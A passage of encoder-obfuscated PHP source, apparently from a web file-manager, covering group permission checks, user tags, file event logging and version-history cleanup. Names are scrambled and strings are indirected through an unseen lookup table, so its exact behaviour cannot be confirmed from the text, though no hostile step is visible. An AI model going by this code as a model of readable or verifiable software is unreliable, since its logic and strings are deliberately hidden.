array($¥ƒ€­â‡[500] => 0, $¥ƒ€­â‡[553] => !1, $¥ƒ€­â‡[2240] => $¥ƒ€­â‡[12]); } $ÓöÕ¢ë = $ÓöÕ¢ë ? $ÓöÕ¢ë : USER_ID; $ãÉªæ‹æ = 0; $ßÏ—²­§ = 0; $ÅÂË²‘ä = 0; $€·±³Ø = 0; $ìÆ½€³ä = 0; $âùë±Ûœ = 0; $Á¸¨À¸ù = 0; $Ë‹®—·É = 0; $Ø¾êå¯– = 1000; $ÍĞË––ß = 0; $Ù“Öˆó = 0; $¬Ñ“‰É = 0; $¦Ğú—¸¯ = 0; $‘££³íÍ = 0; foreach ($šĞ×İŠ as $ê™–ñÏá) { $²ÏÆÇ‡¿ = $this->authInfo($ê™–ñÏá); if (!$²ÏÆÇ‡¿) { continue; } $øÂé¦û = $ê™–ñÏá[$¥ƒ€­â‡[582]]; $åê’Ãò§ = $ê™–ñÏá[$¥ƒ€­â‡[194]]; $£ÂÙ÷… = intval($²ÏÆÇ‡¿[$¥ƒ€­â‡[499]]); if ($ê™–ñÏá[$¥ƒ€­â‡[191]] == SourceModel::TYPE_USER && $øÂé¦û == $ÓöÕ¢ë) { $ãÉªæ‹æ = !0; $ÅÂË²‘ä = $²ÏÆÇ‡¿; $ßÏ—²­§ = $£ÂÙ÷…; $€·±³Ø = $åê’Ãò§; } else { if ($ê™–ñÏá[$¥ƒ€­â‡[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($øÂé¦û, $ÓöÕ¢ë)) { $ìÆ½€³ä = !0; $¶Æ„ëØİ = $this->groupStepToUserGroup($øÂé¦û, $ÓöÕ¢ë); if ($¶Æ„ëØİ < $Ø¾êå¯–) { $Ø¾êå¯– = $¶Æ„ëØİ; $âùë±Ûœ = $£ÂÙ÷…; $Á¸¨À¸ù = $²ÏÆÇ‡¿; $ÍĞË––ß = $øÂé¦û; $Ë‹®—·É = $åê’Ãò§; } if ($¶Æ„ëØİ == $Ø¾êå¯– && $£ÂÙ÷… >= $âùë±Ûœ) { $âùë±Ûœ = $£ÂÙ÷…; $Á¸¨À¸ù = $²ÏÆÇ‡¿; $ÍĞË––ß = $øÂé¦û; $Ë‹®—·É = $åê’Ãò§; } } else { if (!$øÂé¦û || $øÂé¦û == $¥ƒ€­â‡[231]) { $Ù“Öˆó = !0; $¦Ğú—¸¯ = $²ÏÆÇ‡¿; $¬Ñ“‰É = $£ÂÙ÷…; $‘££³íÍ = $åê’Ãò§; } } } } if ($ãÉªæ‹æ) { $ªèº€Ãô = $ßÏ—²­§; $²ÏÆÇ‡¿ = $ÅÂË²‘ä; $ê¦³ÃÚ = $€·±³Ø; $€‰Ï•» = LNG($¥ƒ€­â‡[2247]); } else { if ($ìÆ½€³ä) { $ªèº€Ãô = $âùë±Ûœ; $²ÏÆÇ‡¿ = $Á¸¨À¸ù; $ê¦³ÃÚ = $Ë‹®—·É; $œçªæİË = Model($¥ƒ€­â‡[598])->getInfo($ÍĞË––ß); $€‰Ï•» = $¥ƒ€­â‡[176] . $œçªæİË[$¥ƒ€­â‡[602]] . $¥ƒ€­â‡[2248] . LNG($¥ƒ€­â‡[2249]); } else { if ($Ù“Öˆó) { $ªèº€Ãô = $¬Ñ“‰É; $²ÏÆÇ‡¿ = $¦Ğú—¸¯; $ê¦³ÃÚ = $‘££³íÍ; $€‰Ï•» = LNG($¥ƒ€­â‡[2227]); } else { $ªèº€Ãô = 0; $²ÏÆÇ‡¿ = !1; $€‰Ï•» = $¥ƒ€­â‡[12]; $ê¦³ÃÚ = $¥ƒ€­â‡[12]; } } } $¶¡Ê­é = array($¥ƒ€­â‡[2239] => intval($ªèº€Ãô), $¥ƒ€­â‡[2229] => $²ÏÆÇ‡¿, $¥ƒ€­â‡[2240] => $€‰Ï•», $¥ƒ€­â‡[2235] => $ê¦³ÃÚ); return $¶¡Ê­é; } private function groupContainUser($ù¿Ô¨Æ, $¹´¡Ãî = false) { return in_array($ù¿Ô¨Æ, $this->userGroupParents($¹´¡Ãî)); } private function groupStepToUserGroup($ûÙ›ÙĞ·, $›õ‰ûŞ¢ = false) { $÷Şï¾Óş =& $_SERVER[åÄ¼Ùßš]; $³âşÑ¶õ = $this->userGroupList($›õ‰ûŞ¢); $­®‡›™ø = 1000; $Ê®¨²ô´ = $GLOBALS[$÷Şï¾Óş[6]][$÷Şï¾Óş[92]][$÷Şï¾Óş[2124]] == 1; $æËÉúˆ¥ = $Ê®¨²ô´ ? 3 : 2; foreach ($³âşÑ¶õ as $¥Îİ—îÊ) { if ($¥Îİ—îÊ[$÷Şï¾Óş[1428]] == $ûÙ›ÙĞ·) { return 0; } $Ê¸­ıâ = explode($÷Şï¾Óş[50], trim($¥Îİ—îÊ[$÷Şï¾Óş[597]], $÷Şï¾Óş[50])); if ($Ê¸­ıâ[0] == $÷Şï¾Óş[231] && count($Ê¸­ıâ) > $æËÉúˆ¥) { $ãı²ª­ş = array_reverse(array_slice($Ê¸­ıâ, $æËÉúˆ¥)); $ğñãÈåÇ = array_search($ûÙ›ÙĞ·, $ãı²ª­ş); if ($ğñãÈåÇ !== !1 && $ğñãÈåÇ + 1 <= $­®‡›™ø) { $­®‡›™ø = $ğñãÈåÇ + 1; } } } return $­®‡›™ø; } private function userGroupList($ÚêìûØ = false, $Ó›–™úë = false) { $òÏ—’¬ï =& $_SERVER[åÄ¼Ùßš]; static $ç°äù” = array(); if (isset($ç°äù”[$ÚêìûØ])) { return $ç°äù”[$ÚêìûØ]; } if (!$Ó›–™úë) { $Ó›–™úë = Model($òÏ—’¬ï[610])->getInfo($ÚêìûØ); } $ç°äù”[$ÚêìûØ] = array_to_keyvalue($Ó›–™úë[$òÏ—’¬ï[1427]], $òÏ—’¬ï[1428]); return $ç°äù”[$ÚêìûØ]; } public function userGroupParents($ÑªÙ›õ³) { $·‘…Ö³… =& $_SERVER[åÄ¼Ùßš]; static $Í‚¸şåˆ = array(); $ÑªÙ›õ³ = $ÑªÙ›õ³ ? $ÑªÙ›õ³ : USER_ID; if (isset($Í‚¸şåˆ[$ÑªÙ›õ³])) { return $Í‚¸şåˆ[$ÑªÙ›õ³]; } $•„¦¤³’ = $this->userGroupList($ÑªÙ›õ³); $† ’ô³ø = array(); $¥ä¡ğâ× = $GLOBALS[$·‘…Ö³…[6]][$·‘…Ö³…[92]][$·‘…Ö³…[2124]] == 1; $ìÃ¥ˆİ = $¥ä¡ğâ× ? 3 : 2; foreach ($•„¦¤³’ as $ã’ÒÍ£) { $¤üô°ùÓ = array($ã’ÒÍ£[$·‘…Ö³…[1428]]); $«ø·¯¨ = explode($·‘…Ö³…[50], trim($ã’ÒÍ£[$·‘…Ö³…[597]], $·‘…Ö³…[50])); if ($«ø·¯¨[0] == $·‘…Ö³…[231] && count($«ø·¯¨) > $ìÃ¥ˆİ) { $´Ô²±„ö = array_slice($«ø·¯¨, $ìÃ¥ˆİ); $¤üô°ùÓ = array_merge($¤üô°ùÓ, array_reverse($´Ô²±„ö)); } $† ’ô³ø = array_merge($† ’ô³ø, $¤üô°ùÓ); } $Í‚¸şåˆ[$ÑªÙ›õ³] = array_unique($† ’ô³ø); return $Í‚¸şåˆ[$ÑªÙ›õ³]; } public function authTargetInfoMake($ş¶€²) { $×ß’‚£ù =& $_SERVER[åÄ¼Ùßš]; $êåçóŒï = array(); $äÏ¾ğß” = array(); foreach ($ş¶€² as $Ş÷´”­Ÿ) { if ($Ş÷´”­Ÿ[$×ß’‚£ù[191]] == SourceModel::TYPE_USER) { $êåçóŒï[] = intval($Ş÷´”­Ÿ[$×ß’‚£ù[582]]); } else { if ($Ş÷´”­Ÿ[$×ß’‚£ù[191]] == SourceModel::TYPE_GROUP) { $äÏ¾ğß”[] = intval($Ş÷´”­Ÿ[$×ß’‚£ù[582]]); } } } if ($êåçóŒï) { $êåçóŒï = Model($×ß’‚£ù[590])->userListInfo($êåçóŒï); } if ($äÏ¾ğß”) { $ƒÜâ¾Şö = array($×ß’‚£ù[2106] => array($×ß’‚£ù[504], $äÏ¾ğß”)); $äÏ¾ğß” = Model($×ß’‚£ù[598])->field($×ß’‚£ù[2250])->where($ƒÜâ¾Şö)->select(); $äÏ¾ğß” = array_to_keyvalue($äÏ¾ğß”, $×ß’‚£ù[1428]); } return array($×ß’‚£ù[2251] => $êåçóŒï, $×ß’‚£ù[2252] => $äÏ¾ğß”); } public function authInfo($»åÚ‹œ×) { $ãŞÚÌ×à =& $_SERVER[åÄ¼Ùßš]; if ($»åÚ‹œ×[$ãŞÚÌ×à[2125]]) { $Ò¡®½‡« = Model($ãŞÚÌ×à[584])->listData($»åÚ‹œ×[$ãŞÚÌ×à[2125]]); if (!$Ò¡®½‡«) { return !1; $…¢õ÷½ = Model($ãŞÚÌ×à[584])->listData(); $éõñÖÀŸ = array_filter_by_field($…¢õ÷½, $ãŞÚÌ×à[499], $ãŞÚÌ×à[231]); return $éõñÖÀŸ; } $âõ¾ãÇª = array_field_key($Ò¡®½‡«, array($ãŞÚÌ×à[484], $ãŞÚÌ×à[32], $ãŞÚÌ×à[499], $ãŞÚÌ×à[2040], $ãŞÚÌ×à[2041])); $âõ¾ãÇª[$ãŞÚÌ×à[2253]] = $»åÚ‹œ×; return $âõ¾ãÇª; } else { return array($ãŞÚÌ×à[505] => 0, $ãŞÚÌ×à[2023] => $»åÚ‹œ×[$ãŞÚÌ×à[2188]], $ãŞÚÌ×à[506] => $ãŞÚÌ×à[12], $ãŞÚÌ×à[2040] => $ãŞÚÌ×à[2254]); } } } goto B¼Ë²¤ÁêÕ; Eù¹Ê¥åî: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\56\x74\x61\147\114\151\x73\x74"; public $modelType = "\125\x73\145\x72\x4f\160\x74\x69\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\163\164\171\x6c\145", "\163\157\162\164"); public function listData($›¸¼Ñºô = false, $¬ˆ’›Ñç = "\x73\x6f\x72\x74", $–ËëÕÆ³ = false) { return parent::listData($›¸¼Ñºô, $¬ˆ’›Ñç, $–ËëÕÆ³); } public function remove($Ù±¦Õ×) { return parent::remove($Ù±¦Õ×); } public function add($ó§ÚƒÍè, $ºóîíÂ = "\x6c\141\x62\145\154\x2d\147\x72\x65\x79\55\156\157\162\x6d\x61\154") { $Ïøñ¸é– =& $_SERVER[åÄ¼Ùßš]; if ($this->findByName($ó§ÚƒÍè)) { return !1; } $ÎÖîŸšû = array($Ïøñ¸é–[506] => $ó§ÚƒÍè, $Ïøñ¸é–[571] => $ºóîíÂ, $Ïøñ¸é–[2021] => $this->getSort($Ïøñ¸é–[338]) + 1); return parent::insert($ÎÖîŸšû); } public function update($Ğê‘èÙç, $ñÛ©Í) { $Ô£ÆÎ¶ =& $_SERVER[åÄ¼Ùßš]; $å•ïÕ‚ = $this->listData($Ğê‘èÙç); $Ùè¥ƒğ’ = $this->findByName($ñÛ©Í[$Ô£ÆÎ¶[32]]); if (!$å•ïÕ‚ || $Ùè¥ƒğ’ && $Ùè¥ƒğ’[$Ô£ÆÎ¶[484]] != $å•ïÕ‚[$Ô£ÆÎ¶[484]]) { return !1; } return parent::update($Ğê‘èÙç, $ñÛ©Í); } public function moveTop($úÓ´åÎË) { $ÈïùÁÔ =& $_SERVER[åÄ¼Ùßš]; $®·õ’ø– = parent::listData(); $Ÿƒ¤—¶İ = $this->getSort($ÈïùÁÔ[337]); foreach ($®·õ’ø– as &$½‚€©–”) { if ($½‚€©–”[$ÈïùÁÔ[484]] == $úÓ´åÎË) { $½‚€©–”[$ÈïùÁÔ[2041]] = $Ÿƒ¤—¶İ; continue; } $½‚€©–”[$ÈïùÁÔ[2041]] += 1; } unset($½‚€©–”); return parent::resetData($®·õ’ø–); } public function moveBottom($í¶ÌàÃß) { $’’İ££ =& $_SERVER[åÄ¼Ùßš]; $œÛçÎçÑ = $this->getSort($’’İ££[338]) + 1; return parent::update($í¶ÌàÃß, array($’’İ££[2041] => $œÛçÎçÑ)); } public function resetSort($‚÷©íğÜ) { $ö²¨Ù€¢ =& $_SERVER[åÄ¼Ùßš]; $½º‘È¯’ = array(); $‚÷©íğÜ = is_array($‚÷©íğÜ) ? $‚÷©íğÜ : array(); for ($Ó©Ê•ôÊ = 0; $Ó©Ê•ôÊ < count($‚÷©íğÜ); $Ó©Ê•ôÊ++) { $½º‘È¯’[$‚÷©íğÜ[$Ó©Ê•ôÊ] . $ö²¨Ù€¢[12]] = $Ó©Ê•ôÊ + 1; } $·‰îÜ› = parent::listData(); foreach ($·‰îÜ› as &$Ş¾µŞ) { $ ¹ö¿¾á = $½º‘È¯’[$Ş¾µŞ[$ö²¨Ù€¢[484]]]; $Ş¾µŞ[$ö²¨Ù€¢[2041]] = $ ¹ö¿¾á ? $ ¹ö¿¾á : $Ş¾µŞ[$ö²¨Ù€¢[2041]]; } unset($Ş¾µŞ); return parent::resetData($·‰îÜ›); } private function getSort($»§¢Ú³¦) { $¤˜„¹«º =& $_SERVER[åÄ¼Ùßš]; $Ûôˆ·Ğœ = parent::listData(); $ß¥Ì³¶ = array_to_keyvalue($Ûôˆ·Ğœ, $¤˜„¹«º[12], $¤˜„¹«º[2041]); if (!$ß¥Ì³¶) { $ß¥Ì³¶ = array(0); } $Ş–ò÷‹º = $»§¢Ú³¦ == $¤˜„¹«º[338] ? max($ß¥Ì³¶) : min($ß¥Ì³¶); return intval($Ş–ò÷‹º); } } goto aÌ»Ç˜ˆ’É; B¼Ë²¤ÁêÕ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\143\145\x5f\145\x76\145\156\x74"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\151\155\145", "\164\151\155\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\x6e\143\164\151\x6f\x6e"), array("\x64\145\x73\x63", '', "\x69\x6e\163\145\162\x74\x2c\165\160\x64\x61\164\145\x2c\x73\x65\154\x65\x63\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¦Æàø, $¹ÈÂ¦Ø, $¥»–º­î = '') { $È®°’‹ =& $_SERVER[åÄ¼Ùßš]; if (!$this->eventSave) { return; } $½•ƒÁ‹ = Model($È®°’‹[1466])->sourceInfo($¦Æàø); if (!$½•ƒÁ‹) { return !1; } if ($this->isDisableEvent($½•ƒÁ‹, $¹ÈÂ¦Ø)) { return; } if ($¥»–º­î && is_string($¥»–º­î)) { $¥»–º­î = array($È®°’‹[2056] => $¥»–º­î); } $òûøúæ = KodUser::id(); $ùÆÒØä— = array($È®°’‹[503] => $¦Æàø, $È®°’‹[2255] => $½•ƒÁ‹[$È®°’‹[193]], $È®°’‹[2256] => $½•ƒÁ‹[$È®°’‹[32]], $È®°’‹[595] => !empty($½•ƒÁ‹[$È®°’‹[595]]) ? $½•ƒÁ‹[$È®°’‹[595]] : $È®°’‹[12], $È®°’‹[1808] => $òûøúæ, $È®°’‹[508] => $¹ÈÂ¦Ø, $È®°’‹[1810] => $¥»–º­î); $this->addSystemLog($¹ÈÂ¦Ø, $ùÆÒØä—); unset($ùÆÒØä—[$È®°’‹[2256]], $ùÆÒØä—[$È®°’‹[595]]); return $this->add($ùÆÒØä—); } private function addSystemLog($¯Ã²Š™Ñ, $¬À’µ£Ö) { $¯×ëÂé¹ =& $_SERVER[åÄ¼Ùßš]; if ($¯Ã²Š™Ñ == $¯×ëÂé¹[2257]) { $¯Ã²Š™Ñ = $¬À’µ£Ö[$¯×ëÂé¹[537]][$¯×ëÂé¹[2258]]; } else { if (in_array($¯Ã²Š™Ñ, array($¯×ëÂé¹[1997], $¯×ëÂé¹[2259]))) { $¯Ã²Š™Ñ = $¬À’µ£Ö[$¯×ëÂé¹[537]][$¯×ëÂé¹[171]]; } } $ç‰¼âö = array_merge($¬À’µ£Ö, array($¯×ëÂé¹[2260] => $¬À’µ£Ö[$¯×ëÂé¹[194]], $¯×ëÂé¹[2261] => $¬À’µ£Ö[$¯×ëÂé¹[2261]])); Hook::trigger($¯×ëÂé¹[2262], $¯×ëÂé¹[2263] . $¯Ã²Š™Ñ, $¬À’µ£Ö); Model($¯×ëÂé¹[1962])->addLog($¯×ëÂé¹[2263] . $¯Ã²Š™Ñ, $ç‰¼âö); } private function isDisableEvent($ˆ½›Öí, $ºŒ¹Ñş³) { $¬åá†ó =& $_SERVER[åÄ¼Ùßš]; if ($ˆ½›Öí[$¬åá†ó[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ºŒ¹Ñş³ == $¬åá†ó[1265]) { return !1; } return !0; } public function eventCreate($îÍÍæÄµ, $½Üäè‰ô) { $ŠŸ°î¡Œ =& $_SERVER[åÄ¼Ùßš]; $¾èşï¼ = Model($ŠŸ°î¡Œ[1466])->sourceInfo($îÍÍæÄµ); $òò»Ìş = array($ŠŸ°î¡Œ[2258] => $½Üäè‰ô, $ŠŸ°î¡Œ[32] => $¾èşï¼[$ŠŸ°î¡Œ[32]]); return $this->addEvent($îÍÍæÄµ, $ŠŸ°î¡Œ[2257], $òò»Ìş); } public function eventFileEdit($é³ÂÌÔÒ) { $õ’œÓÍ° =& $_SERVER[åÄ¼Ùßš]; $è­Ù†çÄ = array($õ’œÓÍ°[2264] => $_SERVER[$õ’œÓÍ°[2265]], $õ’œÓÍ°[2266] => strtolower(ACTION)); if (isset($GLOBALS[$õ’œÓÍ°[7]][$õ’œÓÍ°[2267]])) { $è­Ù†çÄ[$õ’œÓÍ°[2267]] = $õ’œÓÍ°[91]; } return $this->addEvent($é³ÂÌÔÒ, $õ’œÓÍ°[1987], $è­Ù†çÄ); } public function eventRecycle($åÜİëëœ, $Çéæå¬) { return $this->addEvent($åÜİëëœ, $_SERVER[åÄ¼Ùßš][2259], $Çéæå¬); } private static $_removeLast = ''; public function eventRemove($®£Áà”€) { $²ˆÊÜÃ =& $_SERVER[åÄ¼Ùßš]; self::$_removeLast = $®£Áà”€; $Ä¾îô¶Ÿ = Model($²ˆÊÜÃ[1466])->sourceInfo($®£Áà”€); $ú±š™ïç = array_field_key($Ä¾îô¶Ÿ, array($²ˆÊÜÃ[194], $²ˆÊÜÃ[554], $²ˆÊÜÃ[517], $²ˆÊÜÃ[597])); $§ş›ûì = array($²ˆÊÜÃ[171] => $Ä¾îô¶Ÿ[$²ˆÊÜÃ[32]], $²ˆÊÜÃ[2266] => ACTION, $²ˆÊÜÃ[2268] => $ú±š™ïç); return $this->addEvent($Ä¾îô¶Ÿ[$²ˆÊÜÃ[193]], $²ˆÊÜÃ[1265], $§ş›ûì); } public function eventShare($õå„³ßÌ, $Ì±ØÀË) { return $this->addEvent($õå„³ßÌ, $_SERVER[åÄ¼Ùßš][1997], $Ì±ØÀË); } public function eventMove($¡¡¯«»Á, $¥Çñï»œ, $éšÉÕ¾÷) { $¢³«†¡ =& $_SERVER[åÄ¼Ùßš]; if (self::$_removeLast == $¡¡¯«»Á) { return; } $Å…³áÅ¶ = Model($¢³«†¡[1466]); $ü¯†ìË“ = $Å…³áÅ¶->sourceInfo($¡¡¯«»Á); $Ü Ş¢¶¿ = $Å…³áÅ¶->sourceInfo($¥Çñï»œ); $ìÃ¯êİŞ = $Å…³áÅ¶->sourceInfo($éšÉÕ¾÷); $Ü±²àÛ– = array($¢³«†¡[1277] => $¥Çñï»œ, $¢³«†¡[2269] => $Ü Ş¢¶¿[$¢³«†¡[32]], $¢³«†¡[2225] => !empty($Ü Ş¢¶¿[$¢³«†¡[595]]) ? $Ü Ş¢¶¿[$¢³«†¡[595]] : $¢³«†¡[12], $¢³«†¡[1278] => $éšÉÕ¾÷, $¢³«†¡[2270] => $ìÃ¯êİŞ[$¢³«†¡[32]], $¢³«†¡[2271] => !empty($ìÃ¯êİŞ[$¢³«†¡[595]]) ? $ìÃ¯êİŞ[$¢³«†¡[595]] : $¢³«†¡[12]); $this->addEvent($¡¡¯«»Á, $¢³«†¡[636], $Ü±²àÛ–); $ü¯†ìË“ = $Å…³áÅ¶->sourceInfo($¡¡¯«»Á); $Ü±²àÛ– = array($¢³«†¡[194] => $ü¯†ìË“[$¢³«†¡[194]], $¢³«†¡[32] => $ü¯†ìË“[$¢³«†¡[32]]); $this->addEvent($¥Çñï»œ, $¢³«†¡[2272], $Ü±²àÛ–); } public function eventCopy($ë¾âè±ï) { $this->eventCreate($ë¾âè±ï, $_SERVER[åÄ¼Ùßš][634]); } public function eventRename($¯¦éÂæ÷, $»—Û, $ËûÇÔ¢ƒ) { $Ãğ™¹®Ù =& $_SERVER[åÄ¼Ùßš]; $ùÔç›áÊ = array($Ãğ™¹®Ù[1277] => $»—Û, $Ãğ™¹®Ù[1278] => $ËûÇÔ¢ƒ); return $this->addEvent($¯¦éÂæ÷, $Ãğ™¹®Ù[1480], $ùÔç›áÊ); } public function eventAddComment($áËŠ½óĞ, $ì½×õÆ) { return $this->addEvent($áËŠ½óĞ, $_SERVER[åÄ¼Ùßš][2273], $ì½×õÆ); } public function eventAddDesc($¼˜Ó“£í, $Êà¤¿åø) { return $this->addEvent($¼˜Ó“£í, $_SERVER[åÄ¼Ùßš][2274], $Êà¤¿åø); } public function listBySource($ñº÷ƒº) { $ï††¬›‚ =& $_SERVER[åÄ¼Ùßš]; $ô°ßØü = Model($ï††¬›‚[1466])->sourceInfo($ñº÷ƒº); $–Ø¹–Ò¸ = array($ï††¬›‚[503] => $ñº÷ƒº); if ($ô°ßØü[$ï††¬›‚[497]] == $ï††¬›‚[91]) { $ÀØÀà¬Š = Model($ï††¬›‚[1466])->listSearchChildren($ñº÷ƒº, 20000); $ÀØÀà¬Š[] = $ñº÷ƒº . $ï††¬›‚[464]; $–Ø¹–Ò¸ = array($ï††¬›‚[194] => array($ï††¬›‚[7], $ÀØÀà¬Š)); } $˜üÎöæ = $this->where($–Ø¹–Ò¸)->order($ï††¬›‚[2275])->selectPage(); if ($˜üÎöæ[$ï††¬›‚[444]][$ï††¬›‚[445]] == 0) { $˜üÎöæ[$ï††¬›‚[444]][$ï††¬›‚[445]] = 1; $˜üÎöæ[$ï††¬›‚[447]] = array(array($ï††¬›‚[503] => $ñº÷ƒº, $ï††¬›‚[2255] => $ô°ßØü[$ï††¬›‚[193]], $ï††¬›‚[1808] => $ô°ßØü[$ï††¬›‚[538]], $ï††¬›‚[508] => $ï††¬›‚[2276], $ï††¬›‚[509] => $ô°ßØü[$ï††¬›‚[234]], $ï††¬›‚[1810] => $ï††¬›‚[12])); } return $this->eventListParse($˜üÎöæ, $ñº÷ƒº); } private function eventListParse($ÂÕËì­‡, $ü¼êšÙ¢) { $°§µ´˜ =& $_SERVER[åÄ¼Ùßš]; $€ê‚şâ· = $ÂÕËì­‡[$°§µ´˜[447]]; $¿•¾‰ Ø = array_to_keyvalue($€ê‚şâ·, $°§µ´˜[12], $°§µ´˜[194]); $•›óâšÇ = array_to_keyvalue($€ê‚şâ·, $°§µ´˜[12], $°§µ´˜[2261]); foreach ($€ê‚şâ· as $ÄÓ¼ÓÇÑ) { $íÆ°Ù‹ = $ÄÓ¼ÓÇÑ[$°§µ´˜[537]]; if ($ÄÓ¼ÓÇÑ[$°§µ´˜[33]] == $°§µ´˜[636] && isset($íÆ°Ù‹[$°§µ´˜[1277]])) { $¿•¾‰ Ø[] = $íÆ°Ù‹[$°§µ´˜[1277]] . $°§µ´˜[12]; $¿•¾‰ Ø[] = $íÆ°Ù‹[$°§µ´˜[1278]] . $°§µ´˜[12]; } if ($ÄÓ¼ÓÇÑ[$°§µ´˜[33]] == $°§µ´˜[2272] && isset($íÆ°Ù‹[$°§µ´˜[194]])) { $¿•¾‰ Ø[] = $íÆ°Ù‹[$°§µ´˜[194]] . $°§µ´˜[12]; } } $¿•¾‰ Ø = array_merge($¿•¾‰ Ø, $•›óâšÇ, array($ü¼êšÙ¢ . $°§µ´˜[12])); $¿•¾‰ Ø = array_unique($¿•¾‰ Ø); $ÕÂÑëÌÆ = array_unique(array_to_keyvalue($€ê‚şâ·, $°§µ´˜[12], $°§µ´˜[1817])); $”š¨¾Ä± = Model($°§µ´˜[610])->userListInfo($ÕÂÑëÌÆ); $íæÃ¶Ô = Model($°§µ´˜[926])->sourceListInfo($¿•¾‰ Ø, !0); foreach ($€ê‚şâ· as &$ÄÓ¼ÓÇÑ) { if ($ÄÓ¼ÓÇÑ[$°§µ´˜[33]] == $°§µ´˜[636] && isset($ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[1277]])) { $ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[1277]] = $íæÃ¶Ô[$ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[1277]]]; $ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[1278]] = $íæÃ¶Ô[$ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[1278]]]; } if ($ÄÓ¼ÓÇÑ[$°§µ´˜[33]] == $°§µ´˜[2272] && isset($ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[194]])) { $ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[194]] = $íæÃ¶Ô[$ÄÓ¼ÓÇÑ[$°§µ´˜[537]][$°§µ´˜[194]]]; } $ÄÓ¼ÓÇÑ[$°§µ´˜[90]] = $íæÃ¶Ô[$ÄÓ¼ÓÇÑ[$°§µ´˜[194]]]; $ÄÓ¼ÓÇÑ[$°§µ´˜[2277]] = $íæÃ¶Ô[$ÄÓ¼ÓÇÑ[$°§µ´˜[2261]]]; if ($ÄÓ¼ÓÇÑ[$°§µ´˜[33]] == $°§µ´˜[1265]) { $ÄÓ¼ÓÇÑ[$°§µ´˜[2277]] = $ÄÓ¼ÓÇÑ[$°§µ´˜[90]]; $ÄÓ¼ÓÇÑ[$°§µ´˜[2261]] = $ÄÓ¼ÓÇÑ[$°§µ´˜[2277]][$°§µ´˜[194]]; $ÄÓ¼ÓÇÑ[$°§µ´˜[90]] = !1; $ÄÓ¼ÓÇÑ[$°§µ´˜[194]] = $°§µ´˜[12]; } $ÄÓ¼ÓÇÑ[$°§µ´˜[2199]] = $”š¨¾Ä±[$ÄÓ¼ÓÇÑ[$°§µ´˜[1817]]]; } unset($ÄÓ¼ÓÇÑ); $ÂÕËì­‡[$°§µ´˜[447]] = $€ê‚şâ·; return $ÂÕËì­‡; } public function removeBySource($®Û·¶ïÁ) { $àû š½Ü = array($_SERVER[åÄ¼Ùßš][503] => $®Û·¶ïÁ); $this->where($àû š½Ü)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\143\x65\137\150\x69\163\164\x6f\162\171"; public function historyCount($à·îœ„Ù) { $—ï–‘şæ =& $_SERVER[åÄ¼Ùßš]; if (!$à·îœ„Ù) { return array(); } if (is_string($à·îœ„Ù) || is_int($à·îœ„Ù)) { $à·îœ„Ù = array($à·îœ„Ù); } $äÚ‰„ª÷ = array($—ï–‘şæ[194], $—ï–‘şæ[2278] => $—ï–‘şæ[578]); $¬Õ’ã¤¼ = array($—ï–‘şæ[194] => array($—ï–‘şæ[7], $à·îœ„Ù)); $¼çğ†Ú° = $this->field($äÚ‰„ª÷)->where($¬Õ’ã¤¼)->group($—ï–‘şæ[194])->select(); return array_to_keyvalue($¼çğ†Ú°, $—ï–‘şæ[194], $—ï–‘şæ[578]); } public function addHistory($†Ì±Ü, $¶ßÕğàú = '') { $´äÏ¨¨œ =& $_SERVER[åÄ¼Ùßš]; $™©‚Îí‹ = array($´äÏ¨¨œ[503] => $†Ì±Ü[$´äÏ¨¨œ[194]], $´äÏ¨¨œ[1808] => isset($†Ì±Ü[$´äÏ¨¨œ[540]]) ? $†Ì±Ü[$´äÏ¨¨œ[540]] : $†Ì±Ü[$´äÏ¨¨œ[538]], $´äÏ¨¨œ[555] => $†Ì±Ü[$´äÏ¨¨œ[554]], $´äÏ¨¨œ[633] => $†Ì±Ü[$´äÏ¨¨œ[79]], $´äÏ¨¨œ[2279] => $¶ßÕğàú); if ($GLOBALS[$´äÏ¨¨œ[6]][$´äÏ¨¨œ[92]][$´äÏ¨¨œ[1340]] >= 1) { $this->historyAutoClear($™©‚Îí‹[$´äÏ¨¨œ[194]]); $this->add($™©‚Îí‹); } Hook::trigger($´äÏ¨¨œ[2280], $™©‚Îí‹); Model($´äÏ¨¨œ[2281])->eventFileEdit($†Ì±Ü[$´äÏ¨¨œ[194]]); } private function historyAutoClear($¦¦Ö³Ï¥) { $¨²¿Ûê =& $_SERVER[åÄ¼Ùßš]; $úÛ¯µŸ = Model($¨²¿Ûê[866])->get($¨²¿Ûê[1362]); $›íş¬¾Ì = intval($GLOBALS[$¨²¿Ûê[6]][$¨²¿Ûê[92]][$¨²¿Ûê[1340]]); $òöù»öù = $úÛ¯µŸ == $¨²¿Ûê[1363] ? min(5, $›íş¬¾Ì) : $›íş¬¾Ì; $òöù»öù = $òöù»öù <= 0 ? 0 : $òöù»öù - 1; if ($òöù»öù >= 499) { return; } $º‹¨¦îì = array($¨²¿Ûê[503] => $¦¦Ö³Ï¥); $Ä»‡´ĞŒ = $this->field($¨²¿Ûê[2282])->where($º‹¨¦îì)->order($¨²¿Ûê[2275])->select(); if (!$Ä»‡´ĞŒ || $òöù»öù >= count($Ä»‡´ĞŒ)) { return; } $²”õÎ« = array_to_keyvalue($Ä»‡´ĞŒ, $¨²¿Ûê[12], $¨²¿Ûê[484]); $²”õÎ« = array_slice($²”õÎ«, $òöù»öù); $è“Ì´ö¾ = array_to_keyvalue($Ä»‡´ĞŒ, $¨²¿Ûê[12], $¨²¿Ûê[554]); $è“Ì´ö¾ = array_slice($è“Ì´ö¾, $òöù»öù); if (!$²”õÎ« 